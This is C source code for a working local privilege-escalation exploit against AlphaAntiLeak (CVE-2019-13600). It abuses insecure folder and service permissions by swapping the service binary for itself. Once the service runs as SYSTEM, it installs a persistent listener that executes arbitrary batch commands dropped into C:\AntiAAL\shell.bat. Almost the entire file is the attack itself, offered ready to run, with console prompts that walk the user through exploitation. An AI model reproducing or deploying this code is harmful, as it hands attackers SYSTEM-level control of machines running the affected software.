#include <stdio.h>
#include <Windows.h>
#include <dirent.h>
#include <errno.h>

#define EMPTY_STRING ""

int main(int argc, char** argv) {
	FILE* isStage1 = NULL;
	isStage1 = fopen("C:\\AntiAAL\\stage1.txt", "r");
	FILE* isStage2 = NULL;
	isStage2 = fopen("C:\\AntiAAL\\stage2.txt", "r");
	if (isStage1 != NULL) {
		fclose(isStage1);
		if (isStage2 != NULL) {
			fclose(isStage2);
		}
		system("del \"C:\\AntiAAL\\stage1.txt\" /Q /F");
		system("echo. > C:\\AntiAAL\\stage2.txt");
		system("echo ass... > C:\\Windows\\System32\\systemcheck.txt");
		Sleep(1000);
		system("start C:\\AlphaAntiLeak\\AAL\\bin\\server\\AALSvc.exe");
		return 2;
	}
	else if (isStage2 != NULL) {
		fclose(isStage2);
		if (isStage1 != NULL) {
			fclose(isStage1);
		}
		DeleteFileA("C:\\AntiAAL\\stage1.txt");
		DeleteFileA("C:\\AntiAAL\\stage2.txt");
		DeleteFileA("C:\\Windows\\System32\\systemcheck.txt");
		while (TRUE) {
			FILE* readmeFile = NULL;
			readmeFile = fopen("C:\\AntiAAL\\README.txt", "r");
			if (readmeFile == NULL) {
				readmeFile = fopen("C:\\AntiAAL\\README.txt", "w");
				fputs("To execute arbitrary commands, add your commands to the \"shell.bat\"\nfile located at \"C:\\AntiAAL\\shell.bat\". Then, create a text document named \"exec.txt\" in\n\"C:\\AntiAAL\\\".", readmeFile);
			}
			fclose(readmeFile);
			FILE* shellFile = NULL;
			shellFile = fopen("C:\\AntiAAL\\shell.bat", "r");
			if (shellFile == NULL) {
				shellFile = fopen("C:\\AntiAAL\\shell.bat", "w");
				fputs("@echo off\nREM <Add your shell commands below>\n\nREM <Add your shell commands above>", shellFile);
			}
			fclose(shellFile);
			FILE* executeFile = NULL;
			executeFile = fopen("C:\\AntiAAL\\exec.txt", "r");
			if (executeFile != NULL) {
				fclose(executeFile);
				Sleep(200);
				system("start C:\\AntiAAL\\shell.bat");
				DeleteFileA("C:\\AntiAAL\\exec.txt");
			}
			Sleep(3000);
		}
	}
	else {
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 0);
		char buf[MAX_PATH];
		GetCurrentDirectory(MAX_PATH, buf);
		char driveLetter = printf(buf);
		system("cls");
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 3);
		printf("Created by Uncodable on 8/5/2020 at 10:46 PM EST. Last change was on 8/8/2020 at 2:49 AM EST.\n");
		printf("CVE-2019-13600 (Anti AAL) | Rewritten in C\n");
		printf("A vulnerability exists in AlphaAntiLeak (all versions)\n");
		printf("that allows escalation of privileges via insecure folder\n");
		printf("and service permissions.\n\n");
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 14);
		printf("Press any key to begin exploitation...\n");
		char _ = getchar();
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 11);
		printf("[*] ");
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 14);
		printf("Checking if the system is vulnerable...\n");
		DIR* directory = opendir("C:\\AlphaAntiLeak\\AAL\\bin\\server");
		if (directory != NULL) {
			closedir(directory);
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 10);
			printf("[+] ");
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 14);
			printf("System appears to be vulnerable. Continuing exploitation...\n");
			_ = rename("C:\\AlphaAntiLeak\\", "C:\\OldAlphaAntiLeak\\");
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 11);
			printf("[*] ");
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 14);
			printf("Building directories...\n");
			CreateDirectoryA("C:\\AntiAAL\\", NULL);
			CreateDirectoryA("C:\\AlphaAntiLeak\\", NULL);
			CreateDirectoryA("C:\\AlphaAntiLeak\\AAL\\", NULL);
			CreateDirectoryA("C:\\AlphaAntiLeak\\AAL\\bin\\", NULL);
			CreateDirectoryA("C:\\AlphaAntiLeak\\AAL\\bin\\server", NULL);
			CopyFileA(argv[0], "C:\\AlphaAntiLeak\\AAL\\bin\\server\\AALSvc.exe", FALSE);
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 11);
			printf("[*] ");
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 14);
			printf("Initializing stage...\n");
			FILE* stage1 = NULL;
			stage1 = fopen("C:\\AntiAAL\\stage1.txt", "w");
			fclose(stage1);
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 11);
			printf("[*] ");
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 14);
			printf("Initializing exploited service...\n");
			system("net start AALSvc");
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 11);
			printf("[*] ");
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 14);
			printf("Waiting for SYSTEM command listener...\n");
			while (TRUE) {
				FILE* checkSystemShell = NULL;
				checkSystemShell = fopen("C:\\Windows\\System32\\systemcheck.txt", "r");
				if (checkSystemShell != NULL) {
					fclose(checkSystemShell);
					goto systemShell;
				}
			}
		systemShell:
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 10);
			printf("[+] ");
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 14);
			printf("SYSTEM shell acquired. To interact with the listener, refer to the README.txt in \"C:\\AntiAAL\\README.txt\".\n");
			Sleep(4000);
			system("start C:\\AntiAAL\\README.txt");
			_ = getchar();
			return 0;
		}
		else {
			closedir(directory);
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 12);
			printf("[-] ");
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 14);
			printf("Exploit failed. AlphaAntiLeak does not appear to be installed.\n");
			_ = getchar();
			return 1;
		}
	}
}